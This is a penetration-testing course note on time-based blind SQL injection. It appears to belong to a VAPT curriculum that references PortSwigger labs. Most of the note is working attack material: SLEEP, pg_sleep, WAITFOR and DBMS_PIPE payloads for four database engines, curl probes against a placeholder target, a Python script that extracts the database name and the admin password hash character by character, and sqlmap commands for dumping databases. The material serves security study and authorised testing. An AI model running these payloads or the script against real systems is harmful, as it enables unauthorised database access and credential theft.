---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.06 Blind SQLi — Time-Based"
portswigger_labs: "SQL injection"
---

# 06.06 — Blind SQLi — Time-Based

## What is Time-Based Blind SQLi?

Time-based blind SQLi is used when:
- The page produces the same response for both TRUE and FALSE conditions (can't use boolean-based)
- No error messages appear
- No data appears in the response

Instead of visible differences, we infer data from **how long the server takes to respond**. If we inject `SLEEP(5)` and the server takes 5 extra seconds → injection confirmed!

```
BOOLEAN BLIND REQUIRES:
  TRUE response ≠ FALSE response
  
TIME-BASED BLIND REQUIRES:
  TRUE → delayed response (SLEEP triggers)
  FALSE → normal response speed (SLEEP doesn't trigger)

EVEN WORKS WHEN:
  → Response is identical for true/false conditions
  → Response is always 200 OK with same content
  → The page is completely blank
  → It's a fire-and-forget request (no response at all!)
```

---

## Confirming Time-Based Injection

```bash
# MYSQL (SLEEP):
curl -o /dev/null -s -w "Time: %{time_total}s\n" \
  "https://target.com/product?id=1 AND SLEEP(5)--"
# If response takes 5+ seconds → TIME-BASED BLIND CONFIRMED!

# POSTGRESQL (pg_sleep):
curl -o /dev/null -s -w "Time: %{time_total}s\n" \
  "https://target.com/product?id=1; SELECT pg_sleep(5)--"

# MSSQL (WAITFOR DELAY):
curl -o /dev/null -s -w "Time: %{time_total}s\n" \
  "https://target.com/product?id=1; WAITFOR DELAY '0:0:5'--"

# ORACLE:
curl -o /dev/null -s -w "Time: %{time_total}s\n" \
  "https://target.com/product?id=1 AND 1=(SELECT 1 FROM dual WHERE dbms_pipe.receive_message('a',5)=1)--"
```

---

## Conditional Time Delays (The Core Technique)

```sql
-- MYSQL: IF(condition, SLEEP(5), 0)
' AND IF(1=1, SLEEP(5), 0)--    → delays 5 seconds (TRUE)
' AND IF(1=2, SLEEP(5), 0)--    → no delay (FALSE)

-- CHECK DATABASE NAME FIRST CHAR:
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--
→ 5 second delay? → YES, first char is 'm'!
→ No delay? → NO, try next character

-- CHECK ASCII VALUE (binary search):
' AND IF(ASCII(SUBSTRING(database(),1,1))>64, SLEEP(5), 0)--
→ delay = TRUE (>64)
' AND IF(ASCII(SUBSTRING(database(),1,1))>100, SLEEP(5), 0)--
→ delay = TRUE (>100)
' AND IF(ASCII(SUBSTRING(database(),1,1))>110, SLEEP(5), 0)--
→ no delay = FALSE (NOT >110)
→ ASCII is between 101-110 → continue binary search
```

---

## Database-Specific Payloads

### MySQL

```sql
-- SLEEP FUNCTION:
' AND SLEEP(5)--
' AND IF(condition, SLEEP(5), 0)--

-- CONDITIONAL DATABASE NAME EXTRACTION:
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(3), 0)--
' AND IF(LENGTH(database())=6, SLEEP(3), 0)--

-- TABLE EXISTENCE CHECK:
' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='users')=1, SLEEP(5), 0)--

-- PASSWORD EXTRACTION:
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='5', SLEEP(3), 0)--

-- BENCHMARK (alternative to SLEEP, works on older MySQL):
' AND IF(1=1, BENCHMARK(5000000,SHA1('test')), 0)--
```

### PostgreSQL

```sql
-- pg_sleep:
'; SELECT pg_sleep(5)--
' AND (SELECT pg_sleep(5)) IS NOT NULL--

-- CONDITIONAL:
'; SELECT CASE WHEN (condition) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- DATABASE NAME:
'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='m') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- TABLE EXISTENCE:
'; SELECT CASE WHEN (EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='users')) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- PASSWORD:
'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='5') THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### MSSQL

```sql
-- WAITFOR DELAY:
'; WAITFOR DELAY '0:0:5'--

-- CONDITIONAL:
'; IF (condition) WAITFOR DELAY '0:0:5'--

-- DATABASE NAME:
'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--

-- TABLE EXISTENCE:
'; IF (EXISTS(SELECT 1 FROM sysobjects WHERE name='users' AND xtype='U')) WAITFOR DELAY '0:0:5'--

-- PASSWORD:
'; IF (SUBSTRING((SELECT TOP 1 password FROM users WHERE username='admin'),1,1)='5') WAITFOR DELAY '0:0:5'--
```

### Oracle

```sql
-- dbms_pipe.receive_message:
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

-- CONDITIONAL:
' AND CASE WHEN (condition) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END=1--

-- DATABASE USER:
' AND CASE WHEN (SUBSTR(user,1,1)='S') THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END=1--
```

---

## Automated Extraction Script

```python
#!/usr/bin/env python3
import requests, time, string

TARGET = "https://target.com/product?id=1"
SLEEP_TIME = 3
THRESHOLD = SLEEP_TIME * 0.8  # 2.4 seconds = definitely triggered

def is_true(payload):
    start = time.time()
    requests.get(TARGET + payload, timeout=30)
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

# Extract database name:
def extract_string(query, max_len=50):
    result = ""
    for pos in range(1, max_len + 1):
        # Binary search for ASCII value:
        low, high = 32, 126
        found_char = False
        while low <= high:
            mid = (low + high) // 2
            payload = f" AND IF(ASCII(SUBSTRING(({query}),{pos},1))>{mid}, SLEEP({SLEEP_TIME}), 0)--"
            if is_true(payload):
                low = mid + 1
            else:
                high = mid - 1
        if low - 1 > 32:
            result += chr(low - 1)
            print(f"  Position {pos}: {chr(low-1)} → {result}")
        else:
            break  # No more characters
    return result

print("Extracting database name...")
db_name = extract_string("SELECT database()")
print(f"Database: {db_name}")

print("Extracting admin password...")
admin_pass = extract_string("SELECT password FROM users WHERE username='admin'")
print(f"Admin password hash: {admin_pass}")
```

---

## SQLMap for Time-Based

```bash
# TIME-BASED ONLY:
sqlmap -u "https://target.com/product?id=1" --technique=T

# ADJUST SLEEP TIME:
sqlmap -u "https://target.com/product?id=1" --technique=T --time-sec=3

# DUMP DATABASE:
sqlmap -u "https://target.com/product?id=1" --technique=T --dbs

# VIA POST:
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=pass" \
  --technique=T -p username
```

---

## Optimizing Time-Based Extraction

```
THE PROBLEM: Character-by-character extraction is SLOW
  26 chars × 50 char password = 1300 requests minimum
  At 3 seconds each (worst case) = 3900 seconds = 65 minutes!

SOLUTIONS:

1. BINARY SEARCH (built into example above):
   Instead of testing each char (a,b,c,d...z)
   Test: is ASCII > 64? > 96? > 109? etc.
   → Max 7 requests per character instead of 26!

2. REDUCE SLEEP TIME:
   Use 1-2 seconds instead of 5
   Risk: network latency may cause false positives
   Use threshold: count as TRUE if > 1.5x normal response time

3. USE SQLMAP (parallelizes where possible)

4. SWITCH TO BOOLEAN-BLIND (if possible):
   Find ANY visible difference in TRUE vs FALSE responses
   Boolean-blind is much faster (no waiting!)

5. OUT-OF-BAND (DNS exfil) — fastest:
   Single request extracts entire value via DNS!
   See: 07 - Out-of-Band SQLi
```

---

## Related Notes
- [[05 - Blind SQLi Boolean-Based]] — boolean-based (faster when applicable)
- [[07 - Out-of-Band SQLi]] — OOB for blind scenarios
- [[21 - sqlmap Full Usage Guide]] — automated exploitation
- [[15 - MySQL Specific Payloads]] — MySQL SLEEP/IF reference
